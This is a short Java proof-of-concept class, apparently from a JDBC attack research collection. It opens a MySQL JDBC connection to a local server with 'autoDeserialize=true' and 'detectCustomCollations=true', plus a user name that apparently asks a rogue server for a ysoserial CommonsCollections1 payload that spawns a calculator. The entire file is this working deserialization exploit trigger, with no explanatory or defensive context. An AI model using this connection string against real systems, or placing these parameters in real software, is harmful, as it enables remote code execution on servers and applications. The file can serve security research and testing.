package org.dili.jdbcattack;

import java.sql.Connection;
import java.sql.DriverManager;

public class DetectCustomCollations {
    public static void main(String[] args) throws Exception {
        String className = "com.mysql.jdbc.Driver";
        Class.forName(className);
        String url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&" +
                "detectCustomCollations=true&user=yso_CommonsCollections1_calc";
        Connection connection = DriverManager.getConnection(url);
        connection.close();
    }
}
